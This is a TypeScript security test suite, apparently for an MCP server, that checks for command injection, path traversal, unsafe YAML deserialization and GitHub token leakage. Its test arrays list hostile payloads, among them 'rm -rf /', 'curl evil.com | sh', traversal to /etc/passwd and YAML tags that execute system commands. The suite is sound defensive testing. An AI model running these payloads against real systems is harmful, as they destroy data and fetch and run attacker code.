/**
 * Rapid Security Testing for CI/CD
 * Focuses on critical vulnerabilities that can be tested quickly
 */

import { SecurityTestFramework } from './SecurityTestFramework.js';
import { DollhouseMCPServer } from '../../../../src/index.js';

export interface SecurityTestResult {
  test: string;
  passed: boolean;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM';
  error?: string;
  duration: number;
}

export class RapidSecurityTesting {
  private results: SecurityTestResult[] = [];
  private server: DollhouseMCPServer;
  
  constructor() {
    this.server = new DollhouseMCPServer();
  }
  
  /**
   * Run critical security tests only
   * Target: < 30 seconds total runtime
   */
  async runCriticalTests(): Promise<SecurityTestResult[]> {
    const tests = [
      this.testCommandInjection(),
      this.testPathTraversal(),
      this.testYamlDeserialization(),
      this.testTokenExposure()
    ];
    
    this.results = await Promise.all(tests);
    return this.results;
  }
  
  /**
   * Generate security report
   */
  generateReport(): string {
    const critical = this.results.filter(r => r.severity === 'CRITICAL');
    const failed = this.results.filter(r => !r.passed);
    const totalTime = this.results.reduce((sum, r) => sum + r.duration, 0);
    
    return `
# Security Test Report

## Summary
- Total Tests: ${this.results.length}
- Failed: ${failed.length}
- Critical Issues: ${critical.filter(r => !r.passed).length}
- Total Time: ${totalTime}ms

## Failed Tests
${failed.map(r => `- [${r.severity}] ${r.test}: ${r.error}`).join('\n')}

## Test Details
${this.results.map(r => `
### ${r.test}
- Status: ${r.passed ? '✅ PASSED' : '❌ FAILED'}
- Severity: ${r.severity}
- Duration: ${r.duration}ms
${r.error ? `- Error: ${r.error}` : ''}
`).join('\n')}
`;
  }
  
  private async testCommandInjection(): Promise<SecurityTestResult> {
    const start = Date.now();
    try {
      // Test critical command injection payloads
      const criticalPayloads = [
        '; rm -rf /',
        '&& curl evil.com | sh',
        '`touch /tmp/pwned`'
      ];
      
      for (const payload of criticalPayloads) {
        // Test create_persona with injection
        const result = await this.server.createPersona(
          payload,
          'test',
          'test',
          'test instructions'
        );
        
        // Check that dangerous payload was sanitized
        const content = JSON.stringify(result);
        if (content.includes(payload) || content.match(/[;&|`$()]/)) {
          throw new Error(`Command injection not properly blocked: ${payload}`);
        }
      }
      
      return {
        test: 'Command Injection Prevention',
        passed: true,
        severity: 'CRITICAL',
        duration: Date.now() - start
      };
    } catch (error) {
      return {
        test: 'Command Injection Prevention',
        passed: false,
        severity: 'CRITICAL',
        error: error instanceof Error ? error.message : String(error),
        duration: Date.now() - start
      };
    }
  }
  
  private async testPathTraversal(): Promise<SecurityTestResult> {
    const start = Date.now();
    try {
      // Test critical path traversal attempts
      const traversalPayloads = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        'personas/../../../sensitive.txt'
      ];
      
      for (const payload of traversalPayloads) {
        // Test get_persona_details with path traversal
        const result = await this.server.getPersonaDetails(payload);
        
        // Should not access files outside allowed paths
        const content = JSON.stringify(result);
        if (!content.match(/not found|invalid|does not exist/i)) {
          throw new Error(`Path traversal not blocked: ${payload}`);
        }
        if (content.includes('/etc/passwd') || content.includes('system32')) {
          throw new Error(`Path traversal exposed sensitive path: ${payload}`);
        }
      }
      
      return {
        test: 'Path Traversal Prevention',
        passed: true,
        severity: 'CRITICAL',
        duration: Date.now() - start
      };
    } catch (error) {
      return {
        test: 'Path Traversal Prevention',
        passed: false,
        severity: 'CRITICAL',
        error: error instanceof Error ? error.message : String(error),
        duration: Date.now() - start
      };
    }
  }
  
  private async testYamlDeserialization(): Promise<SecurityTestResult> {
    const start = Date.now();
    try {
      // Test dangerous YAML constructs
      const yamlPayloads = [
        '!!js/function "function(){require(\'child_process\').exec(\'calc.exe\')}"',
        '!!python/object/apply:os.system ["rm -rf /"]'
      ];
      
      for (const payload of yamlPayloads) {
        const result = await this.server.createPersona(
          'YAMLTest',
          payload,
          'test',
          payload
        );
        
        // Check dangerous YAML was sanitized
        const content = JSON.stringify(result);
        if (content.includes('!!js/function') || 
            content.includes('!!python/object') ||
            content.includes('__proto__')) {
          throw new Error(`YAML injection not blocked: ${payload}`);
        }
      }
      
      return {
        test: 'YAML Deserialization Safety',
        passed: true,
        severity: 'CRITICAL',
        duration: Date.now() - start
      };
    } catch (error) {
      return {
        test: 'YAML Deserialization Safety',
        passed: false,
        severity: 'CRITICAL',
        error: error instanceof Error ? error.message : String(error),
        duration: Date.now() - start
      };
    }
  }
  
  private async testTokenExposure(): Promise<SecurityTestResult> {
    const start = Date.now();
    try {
      // Test that tokens are not exposed in errors or logs
      const fakeToken = 'ghp_1234567890abcdefghijklmnopqrstuvwxyz';
      process.env.GITHUB_TOKEN = fakeToken;
      
      try {
        // Trigger an error that might expose the token
        await this.server.browseMarketplace('../../../invalid');
      } catch (err) {
        // Check error doesn't contain token
        const errorMessage = err instanceof Error ? err.message : String(err);
        const errorStack = err instanceof Error ? err.stack : '';
        if (errorMessage.includes(fakeToken) || errorStack?.includes(fakeToken)) {
          throw new Error('GitHub token exposed in error message');
        }
      }
      
      // Clean up
      delete process.env.GITHUB_TOKEN;
      
      return {
        test: 'Token Security',
        passed: true,
        severity: 'HIGH',
        duration: Date.now() - start
      };
    } catch (error) {
      delete process.env.GITHUB_TOKEN;
      return {
        test: 'Token Security',
        passed: false,
        severity: 'HIGH',
        error: error instanceof Error ? error.message : String(error),
        duration: Date.now() - start
      };
    }
  }
}

/**
 * Pre-commit hook integration
 */
export async function preCommitSecurityCheck(): Promise<boolean> {
  console.log('🔒 Running rapid security checks...');
  
  const tester = new RapidSecurityTesting();
  const results = await tester.runCriticalTests();
  
  const failed = results.filter(r => !r.passed);
  if (failed.length > 0) {
    console.error('❌ Security check failed:');
    failed.forEach(r => {
      console.error(`  - ${r.test}: ${r.error}`);
    });
    return false;
  }
  
  console.log('✅ All security checks passed');
  return true;
}